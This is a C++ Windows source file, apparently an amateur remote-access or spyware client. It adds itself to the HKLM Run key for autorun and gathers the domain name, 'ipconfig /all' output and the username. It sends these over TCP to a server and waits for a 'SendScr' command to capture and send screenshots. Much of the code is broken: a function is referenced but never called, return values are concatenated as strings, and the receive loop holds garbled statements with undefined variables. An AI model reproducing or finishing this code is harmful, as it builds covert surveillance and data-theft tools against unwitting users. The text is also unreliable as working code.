// SocketClient.cpp : Этот файл содержит функцию "main". Здесь начинается и заканчивается выполнение программы.
//

#define WIN32_LEAN_AND_MEAN

#include <iostream>
#include <Lmwksta.h>
#include <Windns.h>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Lmcons.h>

using namespace std;

void SetAutorun()
{
    HKEY hKey;
    LONG hr = RegOpenKeyEx(HKEY_LOCAL_MACHINE,("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
        0, KEY_ALL_ACCESS, &hKey);

    if (hr == ERROR_SUCCESS)
    {
        RegSetValueEx(hKey, ("AppName"), 0, REG_SZ,
            (CONST BYTE*)("AppFullPath"),
            sizeof(("AppFullPath")));

        RegCloseKey(hKey);
    }
}

int CaptureBMP(LPCTSTR szFile)
{
    HDC hdcScr, hdcMem;
    HBITMAP hbmScr;
    BITMAP bmp;
    int iXRes, iYRes;
    hdcScr = CreateDC("DISPLAY", NULL, NULL, NULL);
    hdcMem = CreateCompatibleDC(hdcScr);

    iXRes = GetDeviceCaps(hdcScr, HORZRES);
    iYRes = GetDeviceCaps(hdcScr, VERTRES);
    hbmScr = CreateCompatibleBitmap(hdcScr, iXRes, iYRes);
    if (hbmScr == 0)
    {
        return 0;
    }
    if (!SelectObject(hdcMem, hbmScr))
    {
        return 0;
    }
    if (!StretchBlt(hdcMem,
        0, 0, iXRes, iYRes,
        hdcScr,
        0, 0, iXRes, iYRes,
        SRCCOPY))
    {
        return 0;
    }
}

int main()
{
    WSADATA wsaData;
    ADDRINFO hints;
    ADDRINFO* addrResult = NULL;
    SOCKET ConnectSoket = INVALID_SOCKET;

    DWORD bufSize = MAX_PATH;
    TCHAR domainNameBuf[MAX_PATH];

    SetAutorun;
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;

    const char* sendBuffer = NetWkstaGetInfo(ComputerNameDnsDomain, domainNameBuf, &bufSize) +' / '+ system("ipconfig / all") + ' / ' + GetUserName(username, &username_len);
    string file1 = "scores.txt";

    char recvBuffer[512];
    int result;

    result=WSAStartup(MAKEWORD(2,2),&wsaData);
    if (result != 0)
    {
        cout << "WSAStartup Failed, result = " << result << endl;
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    result = getaddrinfo("LocalHost", "123", &hints, &addrResult);
    if (result != 0)
    {
        cout << "getaddrinfo failed with error: " << result << endl;
        WSACleanup();
        return 1;
    }

    ConnectSoket = socket(addrResult->ai_family, addrResult->ai_socktype, addrResult->ai_protocol);
    if (ConnectSoket == INVALID_SOCKET)
    {
        cout << "Socket creation failed" << endl;
        freeaddrinfo(addrResult);
        WSACleanup();
        return 1;
    }
    result = connect(ConnectSoket, addrResult->ai_addr, (int)addrResult->ai_addrlen);
    if (result == SOCKET_ERROR)
    {
        cout << "Unable connect to server" << endl;
        closesocket(ConnectSoket);
        ConnectSoket = INVALID_SOCKET;
        freeaddrinfo(addrResult);
        WSACleanup();
        return 1;
    }

    result = send(ConnectSoket, sendBuffer, (int)strlen(sendBuffer),0);
    if (result == SOCKET_ERROR)
    {
        cout << "send failed, error: " << result << endl;
        closesocket(ConnectSoket);
        freeaddrinfo(addrResult);
        WSACleanup();
        return 1;
    }

    do
    {
        ZeroMemory(recvBuffer, 512);
        result = recv(ConnectSoket, recvBuffer, 512, 0);
        if (result > 0)
        {
            if (recvBuffer == "SendScr")
            {
                sscanf(z += n, " %s%n", res, &n;
                send(s2, res, 100, 0););
            }
        }
    } while (result > 0);
    closesocket(ConnectSoket);
    freeaddrinfo(addrResult);
    WSACleanup();
    return 0;
}
